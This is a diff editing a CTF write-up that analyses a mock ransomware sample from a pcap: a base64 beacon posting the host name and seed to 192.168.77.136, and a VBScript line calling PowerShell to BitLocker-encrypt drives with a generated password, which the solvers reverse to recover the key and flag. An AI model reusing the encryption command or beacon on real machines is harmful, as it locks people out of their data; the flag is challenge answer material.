@@ -1,12 +1,9 @@
 # Honey, I shrunk the skids
-
+Solved by Danzi, fjellape & Octagone 
+# Challenge
 Author: LOLASL
 
-Flag: `EPT{it_works_the_machine_works!}`
-
-# Description
-
-`My computer went to ransomland and all I got was this lousy pcap! Can you please help me unlock the FlagDisk.vhdx?`
+>My computer went to ransomland and all I got was this lousy pcap! Can you please help me unlock the `FlagDisk.vhdx?`
 
 # Provided challenge files
 
@@ -18,7 +15,7 @@ Looking at the PCAP, we see two interesting HTTP packets. The IP address 192.168
 
 ![PCAP](pcap.png)
 ---
-Looking at `/updatedlog` we can see the text
+Looking at `/updatedlog` we can see the text.
 ```http
 POST /updatelog HTTP/1.1
 Connection: Keep-Alive
@@ -31,7 +28,7 @@ Host: 192.168.77.136
 
 upgrade=REVTS1RPUC01OUMxQzNECTQzOTA2Ljgz
 ```
-quick base64 decode later we get:
+Quick base64 decode later we get:
 
 ```http
 upgrade=DESKTOP-59C1C3D	43906.83
@@ -41,7 +38,7 @@ We use the `File -> Export Objects -> HTTP` in Wireshark to extract _gpedit.zip_
 
 ![gpedit.msc](gpedit1.png)
 
-Opening it up in VSCode, we see that it's just one massive XML file. Scrolling through, we spot a part where it's using xls.loadXML to load an XML-formatted string. The string looks like its url encoded, so we run it through URL decode in CyberChef, and voilà! We get the entire readable code.
+Opening it up in VSCode, we see that it's just one massive XML file. Scrolling through, we spot a part where it's using `xls.loadXML` to load an XML-formatted string. The string looks like its url encoded, so we run it through URL decode in CyberChef, and voilà! We get the entire readable code.
 
 - [Readable_gpedit.txt](Readable_gpedit.txt)
 
@@ -74,14 +71,12 @@ computerName = CreateObject("WScript.Network").ComputerName
 postDataPlaintext = computerName & vbTab & seed
 postDataPlaintext2 = computerName & vbTab & result
 ```
-Upon further inspection, we see that the script uses strRandom as the BitLocker password, formatted as "'strRandom'" (Chr(34) = " ,Chr(39) = '). The script uses a PowerShell command to convert strRandom into a secure string using `ConvertTo-SecureString` and then applies it as a password to enable BitLocker on the drives.
+Upon further inspection, we see that the script uses `strRandom` as the BitLocker password, formatted as "'strRandom'" (Chr(34) = " ,Chr(39) = '). The script uses a PowerShell command to convert strRandom into a secure string using `ConvertTo-SecureString` and then applies it as a password to enable BitLocker on the drives.
 
 ```vbs
 If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command $a=ConvertTo-SecureString " & Chr(34)  & Chr(39) & strRandom & Chr(39)  & Chr(34) & " -asplaintext -force;Enable-BitLocker " & drives(i) & " -s -qe -pwp -pw $a")).stdout.readall) > 0 Then: End If
 ```
-
-After checking the script and understanding what it does we can decipher out that `43906.83` from the `/updatelog` in the pcap must be the seed that sets the bitlocker password on the disk. Knowing the exact seed value used to generate the BitLocker password for FlagDisk.vhdx allows us to modify the original script to reveal the password. By modifying the script to use the seed `43906.83` and print out strRandom, we should be able to get the same password as the "ransomware" used.
-
+After analyzing the script and understanding how it works, we are pretty sure that the value `43906.83` found in the `/updatelog` within the PCAP file is likely the seed used to set the BitLocker password on the disk. By knowing this exact seed, we can modify the `strRandom` function from the original script and replace the seed with `43906.83`, that should yield the same password used by the ransomware.
 ```vbs
 Dim strRandom
 characters = "THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG!@#$&*-+=_;0123456789thequickbrownfoxjumpsoverthlazydog"
@@ -109,5 +104,5 @@ Now we only need to mount the disk and enter the password
 
 ![flag](flag.png)
 
-and there is the flag :)
+and there is the flag 
 `EPT{it_works_the_machine_works!}`
